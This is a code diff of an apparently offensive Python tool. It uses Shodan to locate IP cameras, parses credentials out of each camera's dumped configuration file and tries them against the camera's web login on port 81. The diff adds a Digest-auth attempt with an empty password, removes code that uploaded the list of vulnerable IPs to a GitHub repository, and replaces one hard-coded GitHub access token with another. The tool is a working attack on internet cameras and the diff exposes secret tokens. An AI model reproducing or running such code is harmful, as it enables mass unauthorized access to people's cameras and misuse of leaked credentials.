@@ -2,9 +2,9 @@ import shodan, os, urllib.request, requests
 from requests import get
 from requests import session
 from colorama import init, Fore, Back
-from github import Github
 from progress.bar import IncrementalBar
 from prettytable import PrettyTable
+from requests.auth import HTTPDigestAuth
 
 os.system('clear || cls')
 
@@ -17,7 +17,7 @@ except:
  input("Something went wrong!")
  exit()
 
-g = Github("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")
+g = Github("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")
 
 # if os.getlogin() in mess:
 #   pass
@@ -86,13 +86,6 @@ def st():
   except:
     print(f'{ip} not available.\n')
     continue
- try:
-  response = requests.get('https://raw.githubusercontent.com/Max412/VR/main/VR.txt')
-  repo = g.get_user().get_repo("VR")
-  file = repo.get_contents("/VR.txt")
-  repo.update_file("VR.txt", "Update", response.text + '\n' + '\n'.join(num_of_vulnerable), file.sha)
- except Exception as e:
-  print(e)
 st()
 
 if len(num_of_vulnerable) >= int('1'):
@@ -126,41 +119,49 @@ if len(num_of_vulnerable) >= int('1'):
   #asq = []
 
   for ipi in num_of_vulnerable:
-   try:
-    user = None
-    password = None
-    file = open(f'camera_{ipi}.ini', 'r', encoding='latin-1')
-
     try:
-     data = file.read().replace('\x00', ' ')
-     words = data.split()
-    except Exception as r:
-     print(r)
-     input('line 188')
-    for i in range(len(words)-1):
+     user = None
+     password = None
+     file = open(f'camera_{ipi}.ini', 'r', encoding='latin-1')
+
      try:
-      page = s.get(url=f'http://{ipi}:81', auth=(words[i], words[i+1]), timeout=10)
-      #print(f"Trying for {ipi}\nUsername: {words[i]}, pass: {words[i+1]}", end='')
-      #username = words[i]
-      #password = words[i+1]
-      if page.status_code == 200:
-       #print(f'\nSuccess: {ipi} | {words[i]}:{words[i+1]}')
-       #asq.append(f'IP: {Fore.CYAN + ipi + Fore.WHITE}\nUsername: {words[i]}\nPassword:{words[i+1]}\n')
-       td.append(ipi)
-       td.append(words[i])
-       td.append(words[i+1])
-       #asq.append(f'IP: {Fore.CYAN + ipi + Fore.WHITE}\nUsername: {words[i]}\nPassword:{words[i+1]}\n')
-       raz += 1
-       #print(asq)
-       bar.next()
-       break
-      #raz += 1
-      #tree.insert('', tk.END, values=(ipi, user, password))
-     except Exception as e:
-      #print('Error: ', e)
-      continue
-   except:
-    continue
+      data = file.read().replace('\x00', ' ')
+      words = data.split()
+     except Exception as r:
+      print(r)
+      input('line 188')
+     for i in range(len(words)-1):
+      try:
+       page = s.get(url=f'http://{ipi}:81', auth=(words[i], words[i+1]), timeout=10)
+       #print(f"Trying for {ipi}\nUsername: {words[i]}, pass: {words[i+1]}", end='')
+       #username = words[i]
+       #password = words[i+1]
+       if page.status_code == 200:
+        #print(f'\nSuccess: {ipi} | {words[i]}:{words[i+1]}')
+        #asq.append(f'IP: {Fore.CYAN + ipi + Fore.WHITE}\nUsername: {words[i]}\nPassword:{words[i+1]}\n')
+        td.append(ipi)
+        td.append(words[i])
+        td.append(words[i+1])
+        #asq.append(f'IP: {Fore.CYAN + ipi + Fore.WHITE}\nUsername: {words[i]}\nPassword:{words[i+1]}\n')
+        raz += 1
+        #print(asq)
+        bar.next()
+        break
+
+       request = get(f'http://{ipi}:81', timeout = 10, verify = False, auth = HTTPDigestAuth(words[i], ''))
+       if request.status_code == 200:
+        td.append(ipi)
+        td.append(words[i])
+        td.append('')
+        bar.next()
+        break
+       #raz += 1
+       #tree.insert('', tk.END, values=(ipi, user, password))
+      except Exception as e:
+        #print('Error: ', e)
+        continue
+    except:
+     continue
 
 # for d in asq:
 #  print(d)
